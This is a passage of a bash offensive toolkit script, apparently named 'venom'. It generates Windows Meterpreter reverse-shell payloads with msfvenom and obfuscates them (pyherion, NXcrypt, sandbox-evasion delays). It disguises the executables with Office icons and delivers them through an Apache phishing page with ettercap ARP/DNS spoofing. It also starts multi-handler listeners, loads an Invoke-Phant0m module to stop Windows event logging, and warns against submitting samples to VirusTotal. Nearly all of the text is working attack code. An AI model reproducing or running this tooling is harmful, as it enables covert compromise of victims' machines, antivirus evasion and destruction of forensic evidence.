if [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi
fi



      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m2|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m2 $ApAcHe/$N4m2 > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m2|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m2 $ApAcHe/$N4m2
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi

        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
          fi
        fi
   fi

sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm $ApAcHe/$N4m.$Ext > /dev/null 2>&1
rm $ApAcHe/$N4m2 > /dev/null 2>&1
rm $ApAcHe/installer.bat > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
cd $IPATH

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_microsoft_menu
  clear
fi
}





# -------------------------------------------------------------
# build shellcode in PYTHON/EXE format (windows)
# 1º option: build default shellcode (my-way)
# 2º veil-evasion python -> pyherion (reproduction)
# 3º use pyinstaller by:david cortesi to compile python-to-exe
# 4º use NXcrypt to insert junk into sourcecode (obfuscation)
# -------------------------------------------------------------
sh_shellcode4 () {
# get user input to build shellcode (python)
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1

# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_winhttps" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 370 --height 350) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="shellcode";fi

echo "[☠] Building shellcode -> C format ..."
sleep 2
if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
   echo "[☠] meterpreter over SSL sellected ..";sleep 1
fi

# display final settings to user
cat << !

    venom settings
    ╔─────────────────────
    | LPORT   : $lport
    | LHOST   : $lhost
    | FORMAT  : C -> WINDOWS
    |_PAYLOAD : $paylo

!

# use metasploit to build shellcode
if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f C > $IPATH/output/chars.raw"
else
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f c > $IPATH/output/chars.raw"
fi

echo ""
# display generated shelcode
cat $IPATH/output/chars.raw
echo "" && echo ""
sleep 2

   # check if all dependencies needed are installed
   # check if template exists (exec.py)
   if [ -e $InJEc2 ]; then
      echo "[☠] exec.py -> found!"
      sleep 2
   else
      echo "[☠] exec.py -> not found!"
      exit
   fi

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi

# EDITING/BACKUP FILES NEEDED
echo "[☠] editing/backup files..."
cp $InJEc2 $IPATH/templates/exec[bak].py


   # edit exec.py using leafpad or gedit editor
   if [ "$DiStR0" = "Kali" ]; then
      leafpad $InJEc2 > /dev/null 2>&1
   else
      gedit $InJEc2 > /dev/null 2>&1
   fi

# move 'compiled' shellcode to output folder
mv $IPATH/templates/exec.py $IPATH/output/$N4m.py
chmod +x $IPATH/output/$N4m.py



# -----------------------------------------
# chose what to do with generated shellcode
# -----------------------------------------
ans=$(zenity --list --title "☠ EXECUTABLE FORMAT ☠" --text "\nChose what to do with: $N4m.py" --radiolist --column "Pick" --column "Option" TRUE "default ($N4m.py) python" FALSE "pyherion ($N4m.py) obfuscated" FALSE "NXcrypt ($N4m.py) obfuscated" FALSE "pyinstaller ($N4m.exe) executable" --width 340 --height 240) > /dev/null 2>&1


   if [ "$ans" "=" "default ($N4m.py) python" ]; then
     zenity --title="☠ PYTHON OUTPUT ☠" --text "PAYLOAD STORED UNDER:\n$IPATH/output/$N4m.py" --info --width 300 > /dev/null 2>&1
     # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
     echo "[☠] Start a multi-handler..."
     echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
     echo "[☯] Please dont test samples on virus total..."
       if [ "$MsFlF" = "ON" ]; then

         if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
           xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
         else
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
         fi

         cd $IPATH/output
         # delete utf-8/non-ancii caracters from output
         tr -cd '\11\12\15\40-\176' < report.log > final.log
         sed -i "s/\[0m//g" final.log
         sed -i "s/\[1m\[34m//g" final.log
         sed -i "s/\[4m//g" final.log
         sed -i "s/\[K//g" final.log
         sed -i "s/\[1m\[31m//g" final.log
         sed -i "s/\[1m\[32m//g" final.log
         sed -i "s/\[1m\[33m//g" final.log
         mv final.log $N4m-$lhost.log > /dev/null 2>&1
         rm report.log > /dev/null 2>&1
         cd $IPATH/
       else

         if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
           xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
         else
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
         fi
       fi



     # CLEANING EVERYTHING UP
     echo "[☠] Cleanning temp generated files..."
     mv $IPATH/templates/exec[bak].py $InJEc2
     rm $IPATH/output/chars.raw > /dev/null 2>&1
     cd $IPATH/
     sleep 2
     clear


   elif [ "$ans" "=" "pyherion ($N4m.py) obfuscated" ]; then
     cd $IPATH/obfuscate
     # obfuscating payload (pyherion.py)
     echo "[☠] pyherion -> encrypting..."
     sleep 2
     echo "[☠] base64+AES encoded -> $N4m.py!"
     sleep 2
     sudo ./pyherion.py $IPATH/output/$N4m.py $IPATH/output/$N4m.py > /dev/null 2>&1
     zenity --title="☠ PYTHON OUTPUT ☠" --text "PAYLOAD STORED UNDER:\n$IPATH/output/$N4m.py" --info --width 300 > /dev/null 2>&1
     # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
     echo "[☠] Start a multi-handler..."
     echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
     echo "[☯] Please dont test samples on virus total..."
       if [ "$MsFlF" = "ON" ]; then

         if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
           xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
         else
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
         fi

         cd $IPATH/output
         # delete utf-8/non-ancii caracters from output
         tr -cd '\11\12\15\40-\176' < report.log > final.log
         sed -i "s/\[0m//g" final.log
         sed -i "s/\[1m\[34m//g" final.log
         sed -i "s/\[4m//g" final.log
         sed -i "s/\[K//g" final.log
         sed -i "s/\[1m\[31m//g" final.log
         sed -i "s/\[1m\[32m//g" final.log
         sed -i "s/\[1m\[33m//g" final.log
         mv final.log $N4m-$lhost.log > /dev/null 2>&1
         rm report.log > /dev/null 2>&1
         cd $IPATH/
       else

         if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
           xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
         else
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
         fi
       fi

     # CLEANING EVERYTHING UP
     echo "[☠] Cleanning temp generated files..."
     mv $IPATH/templates/exec[bak].py $InJEc2
     rm $IPATH/output/chars.raw > /dev/null 2>&1
     cd $IPATH/
     sleep 2
     clear


   elif [ "$ans" "=" "NXcrypt ($N4m.py) obfuscated" ]; then
     echo "[☠] NXcrypt -> found .."
     sleep 2
     echo "[☠] obfuscating -> $N4m.py!"
     sleep 2
     # use NXcrypt to obfuscate sourcecode
     cd $IPATH/obfuscate/
     xterm -T " NXcrypt obfuscator " -geometry 130x26 -e "sudo ./NXcrypt.py --file=$IPATH/output/$N4m.py --output=$IPATH/output/output_file.py"
     rm $IPATH/output/$N4m.py > /dev/null 2>&1
     mv $IPATH/output/output_file.py $IPATH/output/$N4m.py
     zenity --title="☠ PYTHON OUTPUT ☠" --text "PAYLOAD STORED UNDER:\n$IPATH/output/$N4m.py" --info --width 300 > /dev/null 2>&1
     # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
     echo "[☠] Start a multi-handler..."
     echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
     echo "[☯] Please dont test samples on virus total..."
       if [ "$MsFlF" = "ON" ]; then

         if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
           xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
         else
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
         fi

         cd $IPATH/output
         # delete utf-8/non-ancii caracters from output
         tr -cd '\11\12\15\40-\176' < report.log > final.log
         sed -i "s/\[0m//g" final.log
         sed -i "s/\[1m\[34m//g" final.log
         sed -i "s/\[4m//g" final.log
         sed -i "s/\[K//g" final.log
         sed -i "s/\[1m\[31m//g" final.log
         sed -i "s/\[1m\[32m//g" final.log
         sed -i "s/\[1m\[33m//g" final.log
         mv final.log $N4m-$lhost.log > /dev/null 2>&1
         rm report.log > /dev/null 2>&1
         cd $IPATH/
       else

         if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
           xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
         else
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
         fi
         cd $IPATH/
       fi

     # CLEANING EVERYTHING UP
     echo "[☠] Cleanning temp generated files..."
     mv $IPATH/templates/exec[bak].py $InJEc2
     rm $IPATH/output/chars.raw > /dev/null 2>&1
     cd $IPATH/
     sleep 2
     clear


   else


     # check if pyinstaller its installed
     if [ -d $DrIvC/$PiWiN ]; then
       # compile python to exe
       echo "[☠] pyinstaller -> found!"
       sleep 2
       echo "[☠] compile $N4m.py -> $N4m.exe"
       sleep 2
       cd $IPATH/output

# chose executable final icon (.ico)
iCn=$(zenity --list --title "☠ REPLACE AGENT ICON ☠" --text "\nChose icon to use:" --radiolist --column "Pick" --column "Option" TRUE "Windows-Store.ico" FALSE "Windows-Logo.ico" FALSE "Microsoft-Word.ico" FALSE "Microsoft-Excel.ico" --width 320 --height 240) > /dev/null 2>&1

       #
       # PYINSTALLER
       #
       xterm -T " PYINSTALLER " -geometry 110x23 -e "su $user -c '$arch c:/$PyIn/Python.exe c:/$PiWiN/pyinstaller.py --noconsole -i $IPATH/bin/icons/$iCn --onefile $IPATH/output/$N4m.py'"
       cp $IPATH/output/dist/$N4m.exe $IPATH/output/$N4m.exe
       rm $IPATH/output/*.spec > /dev/null 2>&1
       rm $IPATH/output/*.log > /dev/null 2>&1
       rm -r $IPATH/output/dist > /dev/null 2>&1
       rm -r $IPATH/output/build > /dev/null 2>&1
       zenity --title=" PYINSTALLER " --text "PAYLOAD STORED UNDER:\n$IPATH/output/$N4m.exe" --info --width 300 > /dev/null 2>&1
       echo ""
       # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
       echo "[☠] Start a multi-handler..."
       echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
       echo "[☯] Please dont test samples on virus total..."
         if [ "$MsFlF" = "ON" ]; then

           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
           else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
           fi

           cd $IPATH/output
           # delete utf-8/non-ancii caracters from output
           tr -cd '\11\12\15\40-\176' < report.log > final.log
           sed -i "s/\[0m//g" final.log
           sed -i "s/\[1m\[34m//g" final.log
           sed -i "s/\[4m//g" final.log
           sed -i "s/\[K//g" final.log
           sed -i "s/\[1m\[31m//g" final.log
           sed -i "s/\[1m\[32m//g" final.log
           sed -i "s/\[1m\[33m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
         else

           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
           else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
           fi
         fi


       # CLEANING EVERYTHING UP
       echo "[☠] Cleanning temp generated files..."
       mv $IPATH/templates/exec[bak].py $InJEc2
       rm $IPATH/output/chars.raw > /dev/null 2>&1
       sleep 2
       clear

     else

       # compile python to exe
       echo ""
       echo "[☠] pyinstaller -> not found!"
       sleep 2
       echo "[☠] Please run: cd aux && sudo ./setup.sh"
       echo "[☠] to install all missing dependencies .."
       exit
     fi
   fi
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_microsoft_menu
  clear
fi
}





# -----------------------------------------------------
# build shellcode in EXE format (windows-platforms)
# encoded only using msfvenom encoders :( 
# NOTE: use or not PEScrambler on this or msf -x -k ?...
# it flags 12/55 detections this build .
# ------------------------------------------------------
sh_shellcode5 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1

# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_winhttps" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 370) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: notepad" --width 300) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="notepad";fi

echo "[☠] Building shellcode -> C format ..."
sleep 2
echo "[☠] obfuscating -> msf encoders!"
sleep 1
if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
   echo "[☠] meterpreter over SSL sellected ..";sleep 1
fi

echo "" > $IPATH/output/chars.raw
# display final settings to user
cat << !

    venom settings
    ╔─────────────────────
    | LPORT   : $lport
    | LHOST   : $lhost
    | FORMAT  : C -> WINDOWS
    |_PAYLOAD : $paylo

!

# use metasploit to build shellcode (msf encoded)
if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f c > $IPATH/output/chars.raw"
else
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -f c > $IPATH/output/chars.raw"
fi


echo ""
# display generated code
cat $IPATH/output/chars.raw
echo "" && echo ""
sleep 2

   # check if all dependencies needed are installed
   # check if template exists
   if [ -e $InJEc3 ]; then
      echo "[☠] exec_bin.c -> found!"
      sleep 2
   else
      echo "[☠] exec_bin.c -> not found!"
      exit
   fi

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi

   # check if mingw32 exists
   c0m=`which $ComP`> /dev/null 2>&1
   if [ "$?" -eq "0" ]; then
      echo "[☠] mingw32 compiler -> found!"
      sleep 2
 
   else

      echo "[☠] mingw32 compiler -> not found!"
      echo "[☠] Download compiler -> apt-get install mingw32"
      echo ""
      sudo apt-get install mingw32
      echo ""
      fi


# EDITING/BACKUP FILES NEEDED
echo "[☠] editing/backup files..."
cp $InJEc3 $IPATH/templates/exec_bin[bak].c
cp $IPATH/templates/exec_bin2.c $IPATH/templates/exec_bin2[bak].c
cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html



   # C OBFUSCATION MODULE 
   OBF=$(zenity --list --title "☠ AGENT STRING OBFUSCATION ☠" --text "Obfuscate the agent [ template ] command arguments ?\nUsing special escape characters, whitespaces, concaternation, amsi\nsandbox evasion and variables piped and de-obfuscated at runtime\n'The agent will delay 3 sec is execution to evade sandbox detection'" --radiolist --column "Pick" --column "Option" TRUE "None-Obfuscation (default)" FALSE "String Obfuscation (3 sec)" --width 353 --height 245) > /dev/null 2>&1
if [ "$OBF" = "None-Obfuscation (default)" ]; then
  cd $IPATH/templates
  # edit exec.c using leafpad or gedit editor
  if [ "$DiStR0" = "Kali" ]; then
     leafpad $InJEc3 > /dev/null 2>&1
  else
     gedit $InJEc3 > /dev/null 2>&1
  fi


else
echo "[✔] String obfuscation technics sellected .."
cd $IPATH/templates

  # edit exec.c using leafpad or gedit editor
  if [ "$DiStR0" = "Kali" ]; then
     leafpad exec_bin2.c > /dev/null 2>&1
  else
     gedit exec_bin2.c > /dev/null 2>&1
  fi
  mv exec_bin2.c exec_bin.c > /dev/null 2>&1
fi



cd $IPATH/templates
# COMPILING SHELLCODE USING mingw32
echo "[☠] Compiling using mingw32..."
sleep 2
# special thanks to astr0baby for mingw32 -mwindows -lws2_32 flag :D
$ComP exec_bin.c -o $N4m.exe -lws2_32 -mwindows
mv $N4m.exe $IPATH/output/$N4m.exe


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.exe\n\nchose how to deliver: $N4m.exe" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 230) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
         if [ "$MsFlF" = "ON" ]; then

           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
           else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
           fi

           cd $IPATH/output
           # delete utf-8/non-ancii caracters from output
           tr -cd '\11\12\15\40-\176' < report.log > final.log
           sed -i "s/\[0m//g" final.log
           sed -i "s/\[1m\[34m//g" final.log
           sed -i "s/\[4m//g" final.log
           sed -i "s/\[K//g" final.log
           sed -i "s/\[1m\[31m//g" final.log
           sed -i "s/\[1m\[32m//g" final.log
           sed -i "s/\[1m\[33m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
         else

